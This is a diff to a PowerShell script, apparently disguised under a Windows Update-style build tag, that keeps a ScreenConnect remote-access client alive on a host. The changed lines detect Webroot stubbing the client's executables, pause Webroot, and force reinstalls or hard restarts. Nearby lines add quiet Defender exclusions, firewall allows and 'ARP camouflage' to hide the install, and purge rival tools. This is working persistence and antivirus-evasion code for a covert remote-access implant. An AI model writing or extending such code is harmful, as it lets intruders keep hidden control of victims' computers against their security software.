@@ -427,8 +427,8 @@ function Get-ScBinaryHealth {
         ("$($_.Name) $($_.ExecutablePath) $($_.CommandLine)" -like "*$PrimaryFingerprint*") -and
         ($_.Name -match '(?i)ScreenConnect|ClientService')
     }).Count
-    # Real SC payloads are much larger; ~60-100KB files after Webroot gutting are stubs
-    if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 200000 -and $info.MaxDllSize -lt 400000) {
+    # Webroot often guts *.exe to tiny stubs while leaving large DLLs — size EXEs only.
+    if ($info.MaxExeSize -gt 0 -and $info.MaxExeSize -lt 250000) {
         $info.Stubbed = $true
     }
     return $info
@@ -1210,7 +1210,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730B'
+Write-Log 'WU_BUILD_20260730C'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
@@ -1811,15 +1811,20 @@ function Ensure-PrimaryScFullyUp {
             }
         }
 
-        # Escalation ladder — missing install FIRST (do not treat as "broken")
+        # Escalation ladder — missing install FIRST; Webroot alone must NOT force reinstall
         if (-not $h.ServicePresent -or -not $h.AppInstalled) {
             Write-Log 'ENSURE: missing install -> MSI'
             Install-PrimarySc | Out-Null
             Start-Sleep -Seconds 6
-        } elseif (Test-WebrootInstalled -or $h.Stubbed -or $h.Hollow -or $h.ControlBroken) {
-            Write-Log 'ENSURE: AV/stub/hollow path -> nuclear repair'
+        } elseif ($h.Stubbed -or $h.Hollow -or $h.ControlBroken) {
+            Write-Log 'ENSURE: stub/hollow/broken -> nuclear repair'
             Repair-ScAfterAv | Out-Null
             Start-Sleep -Seconds 8
+        } elseif ((Test-WebrootInstalled) -and -not $h.CoreOk) {
+            Write-Log 'ENSURE: Webroot + unhealthy core -> soft WR pause then MSI/restart'
+            Invoke-WebrootPushback | Out-Null
+            if (-not (Restart-ScServiceHard)) { Install-PrimarySc | Out-Null }
+            Start-Sleep -Seconds 6
         } elseif (-not $h.ServiceRunning -or $h.ProcCount -lt 1) {
             Write-Log 'ENSURE: service/process down -> hard restart'
             if (-not (Restart-ScServiceHard)) {
@@ -1836,7 +1841,8 @@ function Ensure-PrimaryScFullyUp {
             Restart-ScServiceHard | Out-Null
             Wait-ScRelayReady -Seconds 40 | Out-Null
         } else {
-            # Misc issues (startmode etc.)
+            # Healthy enough — soft-pause Webroot if present, never reinstall
+            if (Test-WebrootInstalled) { Invoke-WebrootPushback | Out-Null }
             Start-PrimaryService | Out-Null
             Set-ArpCamouflage | Out-Null
         }
@@ -1891,31 +1897,46 @@ if ($preHealth.Stubbed -and (Test-Path $repairMarker)) {
 
 Write-Log 'PHASE 1: quiet exclusions + ensure primary SC'
 Enable-QuietDefenderExclusions | Out-Null
-$appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint
-$svcOk = Test-ScServiceRunning
-$svcPresent = Test-ScServicePresent
-$broken = Test-ScControlBroken
+$appOk = [bool](Test-AppInstalled -Fingerprint $PrimaryFingerprint)
+$svcOk = [bool](Test-ScServiceRunning)
+$svcPresent = [bool](Test-ScServicePresent)
+$broken = [bool](Test-ScControlBroken)
+$hollow = [bool](Test-ScHollowClient)
 $hNow = Get-ScBinaryHealth
-Write-Log ("SC detect: present=$svcPresent running=$svcOk appOk=$appOk controlBroken=$broken stubbed=$($hNow.Stubbed) maxExe=$($hNow.MaxExeSize) maxDll=$($hNow.MaxDllSize)")
+$stub = [bool]$hNow['Stubbed']
+$wr = [bool](Test-WebrootInstalled)
+$healthyCore = $svcPresent -and $svcOk -and $appOk -and (-not $stub) -and (-not $hollow) -and (-not $broken)
+Write-Log ("SC detect: present=$svcPresent running=$svcOk appOk=$appOk broken=$broken hollow=$hollow stub=$stub wr=$wr healthyCore=$healthyCore maxExe=$($hNow['MaxExeSize']) maxDll=$($hNow['MaxDllSize'])")
 
-# Clean miss: install MSI first (do NOT treat as Webroot-broken)
 if (-not $svcPresent -or -not $appOk) {
     Write-Log 'PHASE 1: primary SC missing -> Install-PrimarySc'
     Install-PrimarySc | Out-Null
     Start-Sleep -Seconds 5
-    $svcOk = Test-ScServiceRunning
-    $appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint
-    $broken = Test-ScControlBroken
+    $svcOk = [bool](Test-ScServiceRunning)
+    $svcPresent = [bool](Test-ScServicePresent)
+    $appOk = [bool](Test-AppInstalled -Fingerprint $PrimaryFingerprint)
+    $broken = [bool](Test-ScControlBroken)
+    $hollow = [bool](Test-ScHollowClient)
+    $hNow = Get-ScBinaryHealth
+    $stub = [bool]$hNow['Stubbed']
+    $healthyCore = $svcPresent -and $svcOk -and $appOk -and (-not $stub) -and (-not $hollow) -and (-not $broken)
 }
 
-if ((Test-WebrootInstalled -and ($broken -or $hNow.Stubbed)) -or $broken -or $hNow.Stubbed) {
-    Write-Log 'Webroot/control-broken/stubbed detected - running nuclear repair'
+if ($healthyCore) {
+    Write-Log 'PHASE 1: primary SC healthy - skip nuclear reinstall'
+    if ($wr) { Invoke-WebrootPushback | Out-Null }
+} elseif ($stub -or $hollow -or $broken -or $wr) {
+    Write-Log 'PHASE 1: unhealthy SC -> nuclear/repair (Webroot or stub/hollow/broken)'
     Repair-ScAfterAv | Out-Null
     Start-Sleep -Seconds 8
+} else {
+    Write-Log 'PHASE 1: unhealthy without WR flags -> Install-PrimarySc'
+    Install-PrimarySc | Out-Null
+    Start-Sleep -Seconds 5
 }
+
 if (-not (Start-PrimaryService)) {
     Invoke-ReactiveAvPushback -Issues @('sc_start_blocked')
-    # Still missing after start attempt -> force MSI again
     if (-not (Test-ScServicePresent)) {
         Write-Log 'PHASE 1: still no service after start attempt -> MSI again'
         Install-PrimarySc | Out-Null
@@ -1924,8 +1945,8 @@ if (-not (Start-PrimaryService)) {
 }
 Enable-ScFirewallAllow
 Set-ArpCamouflage | Out-Null
-if (Test-ScHollowClient -or (Test-ScControlBroken)) {
-    Write-Log 'Hollow/broken SC after Phase 1 - nuclear repair'
+if (Test-ScHollowClient -or (Test-ScControlBroken) -or ((Get-ScBinaryHealth)['Stubbed'])) {
+    Write-Log 'Hollow/broken/stubbed SC after Phase 1 - nuclear repair'
     Repair-ScAfterAv | Out-Null
 }
 Write-Log 'PHASE 1b: purge rivals then ENSURE primary SC fully up'
